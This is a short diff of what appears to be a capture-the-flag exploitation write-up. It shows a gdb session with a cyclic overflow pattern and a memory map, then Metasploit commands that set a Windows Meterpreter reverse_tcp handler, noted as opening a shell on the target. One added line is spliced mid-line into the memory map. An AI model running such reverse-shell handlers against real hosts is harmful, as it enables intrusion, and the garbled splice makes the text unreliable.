@@ -393,7 +393,8 @@ Starting program: /.hidden/inventory.exe
 Press enter to view inventory: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
 (gdb) info proc map
-0x804b000  0x806d000    0x22000        0x0 [heap]
+0x804b000  0x806d000    0x22000        0x0 [heap]msf6 exploit(multi/handler) > exploit
+
 	0xf7def000 0xf7fc1000   0x1d2000        0x0 /lib32/libc-2.27.so
 	0xf7fc1000 0xf7fc2000     0x1000   0x1d2000 /lib32/libc-2.27.so
 	0xf7fc2000 0xf7fc4000     0x2000   0x1d2000 /lib32/libc-2.27.so
@@ -535,4 +536,5 @@ msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > set lhost 0.0.0.0
 msf6 exploit(multi/handler) > exploit
 
-
+opens terminal session on the target windows host
+Flag is in Users/Public/Documents
